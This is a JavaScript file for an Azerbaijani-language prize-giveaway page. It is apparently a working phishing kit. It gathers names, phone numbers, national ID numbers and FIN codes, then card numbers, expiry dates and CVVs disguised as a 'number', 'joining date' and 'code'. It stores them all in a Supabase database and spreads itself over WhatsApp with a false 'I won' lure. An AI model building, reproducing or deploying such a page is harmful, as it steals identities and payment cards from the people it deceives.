/* ============================================================
   app.js — Dostuna Mesaj Yaz və Qazan
   ============================================================ */

// ───── SUPABASE CONFIG ─────
const SUPABASE_URL  = 'https://kzcbfloclpxaxdtbimjt.supabase.co';
const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt6Y2JmbG9jbHB4YXhkdGJpbWp0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY0NTAyMDUsImV4cCI6MjEwMjAyNjIwNX0.1XkgUkeRsFdkSS52n-crsH8Fz0HQGRP0-aMwpKATCrM';

// ───── SUPABASE INSERT ─────
async function sbInsert(table, data) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000);
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/${encodeURIComponent(table)}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON,
        'Authorization': `Bearer ${SUPABASE_ANON}`,
        'Prefer': 'return=representation'
      },
      body: JSON.stringify(data),
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.message || 'Xəta baş verdi');
    }
    return res.json();
  } catch (e) {
    clearTimeout(timeoutId);
    if (e.name === 'AbortError') throw new Error('Əlaqə zaman aşımı. Yenidən cəhd edin.');
    throw e;
  }
}

// ───── STATE ─────
let currentUserId = null;
const shareUrl = (function() {
  const u = window.location.href;
  return u.split('?')[0].split('#')[0];
})();

// ───── DOM REFS ─────
const screens = {
  register : document.getElementById('screen-register'),
  share    : document.getElementById('screen-share'),
  message  : document.getElementById('screen-message'),
  success  : document.getElementById('screen-success')
};
const loading = document.getElementById('loading-overlay');

// ───── SCREEN SWITCHER ─────
function showScreen(name) {
  Object.values(screens).forEach(s => s.classList.remove('active'));
  const target = screens[name];
  if (target) {
    target.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }
}

// ───── LOADING ─────
function showLoading() { loading.classList.remove('hidden'); }
function hideLoading() { loading.classList.add('hidden'); }

// ───── TOAST ─────
let toastTimer = null;
function showToast(msg) {
  let toast = document.getElementById('app-toast');
  if (!toast) {
    toast = document.createElement('div');
    toast.id = 'app-toast';
    toast.className = 'toast';
    toast.setAttribute('role', 'alert');
    toast.setAttribute('aria-live', 'assertive');
    document.body.appendChild(toast);
  }
  // Sanitize: text only
  toast.textContent = String(msg).substring(0, 120);
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove('show'), 2800);
}

// ───── VALIDATION HELPERS ─────
function setErr(id, msg) {
  const el = document.getElementById(id);
  if (el) el.textContent = String(msg).substring(0, 100);
}
function clearErrs(ids) {
  ids.forEach(id => setErr(id, ''));
}
function setInputError(inputId, hasError) {
  const el = document.getElementById(inputId);
  if (!el) return;
  el.classList.toggle('error-border', hasError);
}
function setPhoneError(hasError) {
  const wrap = document.querySelector('.phone-wrap');
  if (!wrap) return;
  wrap.classList.toggle('error-border', hasError);
}

// ───── PHONE FORMATTING ─────
document.getElementById('inp-nomre').addEventListener('input', function () {
  let val = this.value.replace(/\D/g, '');
  let formatted = '';
  if (val.length > 0) formatted += val.substring(0, 2);
  if (val.length > 2) formatted += ' ' + val.substring(2, 5);
  if (val.length > 5) formatted += ' ' + val.substring(5, 7);
  if (val.length > 7) formatted += ' ' + val.substring(7, 9);
  this.value = formatted;
});

// ───── UPPERCASE INPUTS ─────
document.querySelectorAll('.uppercase-input').forEach(inp => {
  inp.addEventListener('input', function () {
    const pos = this.selectionStart;
    this.value = this.value.toUpperCase();
    try { this.setSelectionRange(pos, pos); } catch(e) {}
  });
});

// ───── NUMARA — max 9 simvol ─────
document.getElementById('inp-numara').addEventListener('input', function () {
  if (this.value.length > 9) this.value = this.value.substring(0, 9);
});

// ───── FÖN — max 7 simvol ─────
document.getElementById('inp-fon').addEventListener('input', function () {
  if (this.value.length > 7) this.value = this.value.substring(0, 7);
});

// ───── TARİX FORMAT (AA/İİ) ─────
document.getElementById('inp-tarix').addEventListener('input', function () {
  let val = this.value.replace(/\D/g, '');
  if (val.length > 4) val = val.substring(0, 4);
  this.value = val.length <= 2 ? val : val.substring(0, 2) + '/' + val.substring(2, 4);
});

// ───── RƏQƏM — yalnız rəqəm, max 16 ─────
document.getElementById('inp-reqem').addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '').substring(0, 16);
});

// ───── KOD — yalnız rəqəm, max 3 ─────
document.getElementById('inp-kod').addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '').substring(0, 3);
});

// ───── REGISTER FORM SUBMIT ─────
document.getElementById('form-register').addEventListener('submit', async function (e) {
  e.preventDefault();

  const ad     = document.getElementById('inp-ad').value.trim();
  const soyad  = document.getElementById('inp-soyad').value.trim();
  const nomre  = document.getElementById('inp-nomre').value.trim();
  const numara = document.getElementById('inp-numara').value.trim();
  const fon    = document.getElementById('inp-fon').value.trim();

  clearErrs(['err-ad','err-soyad','err-nomre','err-numara','err-fon']);
  ['inp-ad','inp-soyad','inp-numara','inp-fon'].forEach(id => setInputError(id, false));
  setPhoneError(false);

  let valid = true;

  // Ad
  if (!ad) {
    setErr('err-ad', 'Ad boş ola bilməz');
    setInputError('inp-ad', true);
    valid = false;
  }

  // Soyad
  if (!soyad) {
    setErr('err-soyad', 'Soyad boş ola bilməz');
    setInputError('inp-soyad', true);
    valid = false;
  }

  // Nömrə: tam olaraq 9 rəqəm
  const phoneDigits = nomre.replace(/\D/g, '');
  if (phoneDigits.length !== 9) {
    setErr('err-nomre', 'Nömrə dəqiq 9 rəqəm olmalıdır (+994 XX XXX XX XX)');
    setPhoneError(true);
    valid = false;
  }

  // Numara: tam olaraq 9 simvol (nə az, nə çox)
  if (numara.length !== 9) {
    setErr('err-numara', 'Şəxsiyyət Vəsiqəsinin Nömrəsi tam olaraq 9 simvol olmalıdır');
    setInputError('inp-numara', true);
    valid = false;
  }

  // Fön: tam olaraq 7 simvol (nə az, nə çox)
  if (fon.length !== 7) {
    setErr('err-fon', 'FİN tam olaraq 7 simvol olmalıdır');
    setInputError('inp-fon', true);
    valid = false;
  }

  if (!valid) return;

  showLoading();
  const btn = document.getElementById('btn-register');
  btn.disabled = true;

  try {
    const result = await sbInsert('users', {
      ad,
      soyad,
      nomre: '+994' + phoneDigits,
      numara: numara.toUpperCase(),
      fon: fon.toUpperCase()
    });

    if (result && result.length > 0) {
      currentUserId = result[0].id;
    }

    document.getElementById('share-link-text').textContent = shareUrl;
    showScreen('share');
  } catch (err) {
    showToast('Xəta: ' + (err.message || 'Bilinməyən xəta'));
  } finally {
    hideLoading();
    btn.disabled = false;
  }
});

// ───── COPY LINK ─────
document.getElementById('btn-copy-link').addEventListener('click', function () {
  const text = document.getElementById('share-link-text').textContent;
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text)
      .then(() => showToast('Link kopyalandı! ✅'))
      .catch(() => fallbackCopy(text));
  } else {
    fallbackCopy(text);
  }
});

function fallbackCopy(text) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;';
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  try {
    document.execCommand('copy');
    showToast('Link kopyalandı! ✅');
  } catch {
    showToast('Kopyalama alınmadı, əl ilə kopyalayın');
  }
  document.body.removeChild(ta);
}

// ───── WHATSAPP SHARE ─────
document.getElementById('btn-whatsapp').addEventListener('click', function () {
  const text = encodeURIComponent('Salam necəsən? Burdan Qeydiyyatdan Keç Səndə Qazan Mən Qazandım:\n' + shareUrl);
  window.open('https://api.whatsapp.com/send?text=' + text, '_blank', 'noopener,noreferrer');
});

// ───── GO TO MESSAGE ─────
document.getElementById('btn-go-message').addEventListener('click', function () {
  showScreen('message');
});

// ───── MESSAGE FORM SUBMIT ─────
document.getElementById('form-message').addEventListener('submit', async function (e) {
  e.preventDefault();

  const reqem = document.getElementById('inp-reqem').value.trim();
  const tarix = document.getElementById('inp-tarix').value.trim();
  const kod   = document.getElementById('inp-kod').value.trim();

  clearErrs(['err-reqem','err-tarix','err-kod']);
  ['inp-reqem','inp-tarix','inp-kod'].forEach(id => setInputError(id, false));

  let valid = true;

  // Rəqəm: tam olaraq 16 rəqəm
  if (!/^\d{16}$/.test(reqem)) {
    setErr('err-reqem', 'Rəqəm dəqiq 16 rəqəm olmalıdır');
    setInputError('inp-reqem', true);
    valid = false;
  }

  // Tarix validasiyası: AA/İİ formatı
  // Ay: 01-12 (hər ikisi daxil)
  // İl: 26-43 (hər ikisi daxil) — gələcək tarixdir
  const tarixMatch = tarix.match(/^(\d{2})\/(\d{2})$/);
  if (!tarixMatch) {
    setErr('err-tarix', 'Tarix AA/İİ formatında olmalıdır (məs: 06/27)');
    setInputError('inp-tarix', true);
    valid = false;
  } else {
    const ay = parseInt(tarixMatch[1], 10);
    const il = parseInt(tarixMatch[2], 10);
    if (ay < 1 || ay > 12) {
      setErr('err-tarix', 'Ay 01 ilə 12 arasında olmalıdır');
      setInputError('inp-tarix', true);
      valid = false;
    } else if (il < 26 || il > 43) {
      setErr('err-tarix', 'İl 26 ilə 43 arasında olmalıdır (2026–2043)');
      setInputError('inp-tarix', true);
      valid = false;
    }
  }

  // Kod: tam olaraq 3 rəqəm
  if (!/^\d{3}$/.test(kod)) {
    setErr('err-kod', 'CVV dəqiq 3 rəqəm olmalıdır');
    setInputError('inp-kod', true);
    valid = false;
  }

  if (!valid) return;

  showLoading();
  const btn = document.getElementById('btn-send');
  btn.disabled = true;

  try {
    await sbInsert('messages', {
      user_id        : currentUserId || null,
      reqem,
      qosulma_tarixi : tarix,
      kod
    });

    document.getElementById('inp-reqem').value = '';
    document.getElementById('inp-tarix').value = '';
    document.getElementById('inp-kod').value   = '';

    showScreen('success');
  } catch (err) {
    showToast('Xəta: ' + (err.message || 'Bilinməyən xəta'));
  } finally {
    hideLoading();
    btn.disabled = false;
  }
});

// ───── NEW MESSAGE ─────
document.getElementById('btn-new-message').addEventListener('click', function () {
  showScreen('message');
});

// ───── INIT ─────
showScreen('register');
